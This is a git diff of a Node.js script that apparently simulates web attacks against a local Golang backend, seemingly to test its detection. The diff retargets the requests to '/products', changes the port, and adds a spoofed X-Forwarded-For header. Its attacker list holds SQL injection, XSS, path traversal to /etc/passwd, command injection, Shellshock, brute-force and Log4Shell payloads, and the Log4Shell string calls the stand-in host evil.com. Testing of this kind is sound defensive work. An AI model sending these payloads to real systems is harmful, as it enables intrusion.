@@ -7,21 +7,21 @@ const rl = readline.createInterface({
 });
 
 const defaultAttackers = [
-    { ip: '47.252.4.54', type: 'SQL Injection', payload: { username: "' OR 1=1 --", password: "password" }, path: '/' },
-    { ip: '103.255.129.252', type: 'XSS', path: '/search?q=' + encodeURIComponent('<script>alert("XSS")</script>') },
-    { ip: '74.125.102.8', type: 'Path Traversal', path: '/search?q=' + encodeURIComponent('../../etc/passwd') },
-    { ip: '100.26.1.2', type: 'Command Injection', path: '/search?q=' + encodeURIComponent(';ls -la') },
-    { ip: '5.180.181.232', type: 'Malicious User-Agent', path: '/', userAgent: 'sqlmap/1.4.7' },
-    { ip: '93.174.95.106', type: 'Log4Shell', path: '/', headers: { 'User-Agent': '${jndi:ldap://evil.com/x}' } },
-    { ip: '88.135.73.15', type: 'Shellshock', path: '/', headers: { 'User-Agent': '() { :; }; echo "VULN"' } },
-    { ip: '66.240.205.34', type: 'Generic RCE', path: '/search?q=' + encodeURIComponent('base64_decode("evil")') },
-    { ip: '192.168.1.105', type: 'Local Probe', path: '/admin' },
-    { ip: '203.0.113.42', type: 'Brute Force', payload: { user: "admin", pass: "123456" }, path: '/login' }
+    { ip: '47.252.4.54', type: 'SQL Injection', payload: { username: "' OR 1=1 --", password: "password" }, path: '/products' },
+    { ip: '103.255.129.252', type: 'XSS', path: '/products?name=' + encodeURIComponent('<script>alert("XSS")</script>') },
+    { ip: '74.125.102.8', type: 'Path Traversal', path: '/products?name=' + encodeURIComponent('../../etc/passwd') },
+    { ip: '100.26.1.2', type: 'Command Injection', path: '/products?name=' + encodeURIComponent(';ls -la') },
+    { ip: '5.180.181.232', type: 'Malicious User-Agent', path: '/products', userAgent: 'sqlmap/1.4.7' },
+    { ip: '93.174.95.106', type: 'Log4Shell', path: '/products', headers: { 'User-Agent': '${jndi:ldap://evil.com/x}' } },
+    { ip: '88.135.73.15', type: 'Shellshock', path: '/products', headers: { 'User-Agent': '() { :; }; echo "VULN"' } },
+    { ip: '66.240.205.34', type: 'Generic RCE', path: '/products?name=' + encodeURIComponent('base64_decode("evil")') },
+    { ip: '192.168.1.105', type: 'Local Probe', path: '/products/admin' },
+    { ip: '203.0.113.42', type: 'Brute Force', payload: { user: "admin", pass: "123456" }, path: '/products/login' }
 ];
 
 // Target Configuration (Golang Backend)
 const TARGET_HOST = 'localhost';
-const TARGET_PORT = 8080;
+const TARGET_PORT = 7129;
 
 const simulateAttack = (target, customIP = null) => {
     const spoofIP = customIP || target.ip;
@@ -34,6 +34,7 @@ const simulateAttack = (target, customIP = null) => {
         method: isPost ? 'POST' : 'GET',
         headers: {
             'x-simulated-ip': spoofIP,
+            'X-Forwarded-For': spoofIP,
             'User-Agent': target.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) SimulationTool/1.0'
         }
     };
